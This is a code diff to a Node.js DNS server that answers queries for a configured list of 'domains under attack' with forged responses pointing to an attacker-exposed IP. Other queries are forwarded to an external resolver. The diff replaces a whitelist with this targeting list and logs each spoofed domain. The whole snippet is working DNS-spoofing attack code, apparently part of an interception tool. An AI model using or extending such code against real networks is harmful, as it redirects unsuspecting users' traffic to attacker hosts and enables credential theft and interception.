@@ -30,20 +30,17 @@ function get_domain_from_DNS_query(buffer) {
     return sections.join(".")
 }
 
-const IP = require("../config").EXPOSED_IP;
+const {EXPOSED_IP,DOMAINS_UNDER_ATTACK, EXTERNAL_DNS} = require("../config");
 
 
-let whitelist = {
-    "www.microsoft.com": true,
-}
 
-whitelist[IP[3] + "." + IP[2] + "." + IP[1] + "." + IP[0] + ".in-addr.arpa"] = true;
+
 
 const nc = new NetcatServer()
 const server = nc.udp().port(53).listen();
 
 function proxify(rinfo, data) {
-    let client = new NetcatClient().udp().port(53).init().send(data, "8.8.8.8");
+    let client = new NetcatClient().udp().port(53).init().send(data, EXTERNAL_DNS.join("."));
     client.on("data", ({ data, rinfo: dns_rinfo }) => {
         server.port(rinfo.port).send(data, rinfo.address)
     });
@@ -51,16 +48,14 @@ function proxify(rinfo, data) {
 
 server.on('data', async function (rinfo, data) {
     let domain = get_domain_from_DNS_query(data);
-    console.log("[dns]:petition " + domain + (whitelist[domain] ? " (whitelisted)" : ""));
-    if (whitelist[domain]) {
+    if (DOMAINS_UNDER_ATTACK.indexOf(domain) == -1) {
+        console.log("dns not spoofed for",domain);
         proxify(rinfo, data);
         return;
     }
+    console.log("dns spoofed for",domain);
 
-    await https_server.add_domain(domain);
-
-    console.log(" result: " + IP);
-    server.port(rinfo.port).send(forge_DNS_response(data, IP, 60), rinfo.address)
+    server.port(rinfo.port).send(forge_DNS_response(data, EXPOSED_IP, 60), rinfo.address)
 
 })
 
